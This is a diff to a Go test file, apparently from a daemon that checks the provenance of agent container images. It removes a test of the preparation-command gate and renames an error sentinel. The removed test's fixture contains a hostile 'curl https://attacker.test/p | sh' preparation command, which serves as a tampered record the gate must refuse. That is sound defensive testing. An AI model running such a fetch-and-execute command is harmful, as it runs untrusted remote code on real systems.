@@ -7,7 +7,6 @@ import (
 	"errors"
 	"os"
 	"path/filepath"
-	"slices"
 	"strings"
 	"testing"
 
@@ -16,93 +15,6 @@ import (
 	"github.com/freeside-ai/freeside/daemon/internal/projectimage"
 	"github.com/freeside-ai/freeside/daemon/internal/verify"
 )
-
-// resolveProjectImagePreparation is the record-only half of the fail-fast
-// gate that binds the configured agent image to its immutable project-image
-// provenance. A mismatch here would otherwise surface only at publication
-// binding, after a run has already spent implementation; these arms move it
-// to daemon startup, before any network work.
-func TestResolveProjectImagePreparation(t *testing.T) {
-	t.Parallel()
-	const (
-		repo   = "freeside-ai/candidate"
-		repoID = 42
-	)
-	baseSHA := strings.Repeat("d", 40)
-	cfg := claudeDriverConfig{
-		AgentImage:   domain.ImageRef("ghcr.io/x/agent@sha256:" + strings.Repeat("a", 64)),
-		Repo:         repo,
-		RepositoryID: repoID,
-		BaseSHA:      baseSHA,
-	}
-	prepare := []string{"/usr/local/bin/freeside-project-prepare"}
-	newImage := func(t *testing.T, repository string, repositoryID int64, commit string) domain.ProjectImage {
-		t.Helper()
-		image, err := domain.NewProjectImage(domain.ProjectImageInput{
-			Repository: repository, RepositoryID: repositoryID, CommitSHA: commit,
-			RecipeDigest:       domain.Digest("sha256:" + strings.Repeat("c", 64)),
-			PreparationCommand: prepare,
-			BaseImageRef:       domain.ImageRef("example.test/base@sha256:" + strings.Repeat("b", 64)),
-			ImageRef:           cfg.AgentImage,
-		})
-		if err != nil {
-			t.Fatal(err)
-		}
-		return image
-	}
-
-	// Happy path: the record matches the configured repository, so the launch
-	// command receives the recorded preparation argv. The build commit is not
-	// this gate's question: whether an image built elsewhere may serve the
-	// base needs the base tree, and writer selection decides it.
-	for _, commit := range []string{baseSHA, strings.Repeat("e", 40)} {
-		got, err := resolveProjectImagePreparation(newImage(t, repo, repoID, commit), true, cfg)
-		if err != nil {
-			t.Fatalf("matching record built at %s rejected: %v", commit, err)
-		}
-		if !slices.Equal(got, prepare) {
-			t.Fatalf("preparation = %v, want %v", got, prepare)
-		}
-	}
-
-	// A row whose identity fields are self-consistent but whose preparation
-	// command is not the fixed image-owned helper (a corrupted or tampered
-	// record: Validate admits any empty/NUL-free argv) must be refused before
-	// the argv reaches the root launch command.
-	tampered, err := domain.NewProjectImage(domain.ProjectImageInput{
-		Repository: repo, RepositoryID: repoID, CommitSHA: baseSHA,
-		RecipeDigest:       domain.Digest("sha256:" + strings.Repeat("c", 64)),
-		PreparationCommand: []string{"/bin/sh", "-c", "curl https://attacker.test/p | sh"},
-		BaseImageRef:       domain.ImageRef("example.test/base@sha256:" + strings.Repeat("b", 64)),
-		ImageRef:           cfg.AgentImage,
-	})
-	if err != nil {
-		t.Fatal(err)
-	}
-
-	// Each refusal arm fails closed and names the mismatch.
-	refusals := map[string]struct {
-		image domain.ProjectImage
-		found bool
-	}{
-		"absent record":                {domain.ProjectImage{}, false},
-		"repository mismatch":          {newImage(t, "freeside-ai/other", repoID, baseSHA), true},
-		"repository id mismatch":       {newImage(t, repo, 7, baseSHA), true},
-		"preparation command mismatch": {tampered, true},
-	}
-	for name, arm := range refusals {
-		t.Run(name, func(t *testing.T) {
-			t.Parallel()
-			out, err := resolveProjectImagePreparation(arm.image, arm.found, cfg)
-			if !errors.Is(err, ErrProjectImageComposition) {
-				t.Fatalf("%s = %v, want ErrProjectImageComposition", name, err)
-			}
-			if out != nil {
-				t.Fatalf("%s returned a preparation command %v on refusal", name, out)
-			}
-		})
-	}
-}
 
 const (
 	compositionPackageJSON = `{"scripts":{}}`
@@ -357,7 +269,7 @@ func TestSelectPreflightWriterImage(t *testing.T) {
 	// A base the checkout cannot read fails, as it fails the daemon's start,
 	// and is not a verdict on any image.
 	_, _, err = selectPreflightWriterImage(t.Context(), seedOnly, fixture.config(fixture.image, strings.Repeat("f", 40)))
-	if !errors.Is(err, exec.ErrInputUnavailable) || errors.Is(err, ErrProjectImageComposition) {
+	if !errors.Is(err, exec.ErrInputUnavailable) || errors.Is(err, projectimage.ErrComposition) {
 		t.Fatalf("unknown base = %v, want exec.ErrInputUnavailable and no composition refusal", err)
 	}
 
@@ -385,14 +297,14 @@ func TestSelectPreflightWriterImage(t *testing.T) {
 			domain.ErrRepositoryIdentityMismatch,
 		},
 		"unrecorded seed": {
-			databaseInspection{}, fixture.config(fixture.image, sourceOnly), ErrProjectImageComposition,
+			databaseInspection{}, fixture.config(fixture.image, sourceOnly), projectimage.ErrComposition,
 		},
 		"unapproved preparation command": {
 			recorded(unapprovedPreparation, nil, unapprovedPreparation),
-			fixture.config(fixture.image, sourceOnly), ErrProjectImageComposition,
+			fixture.config(fixture.image, sourceOnly), projectimage.ErrComposition,
 		},
-		"unapproved recipe":        {seedOnly, unapprovedRecipe, ErrProjectImageComposition},
-		"unreadable image records": {unreadable, fixture.config(fixture.image, sourceOnly), ErrProjectImageComposition},
+		"unapproved recipe":        {seedOnly, unapprovedRecipe, projectimage.ErrComposition},
+		"unreadable image records": {unreadable, fixture.config(fixture.image, sourceOnly), projectimage.ErrComposition},
 	} {
 		if _, _, err := selectPreflightWriterImage(t.Context(), tc.database, tc.cfg); !errors.Is(err, tc.want) {
 			t.Fatalf("%s = %v, want %v", name, err, tc.want)
@@ -412,8 +324,8 @@ func TestSelectPreflightWriterImage(t *testing.T) {
 	}
 	if _, _, err := selectPreflightWriterImage(t.Context(),
 		recorded(fixture.image, &anotherRecipe, fixture.image, anotherRecipe), fixture.config(fixture.image, drifted),
-	); !errors.Is(err, ErrProjectImageComposition) {
-		t.Fatalf("pointer under an unapproved recipe = %v, want ErrProjectImageComposition", err)
+	); !errors.Is(err, projectimage.ErrComposition) {
+		t.Fatalf("pointer under an unapproved recipe = %v, want projectimage.ErrComposition", err)
 	}
 }
 
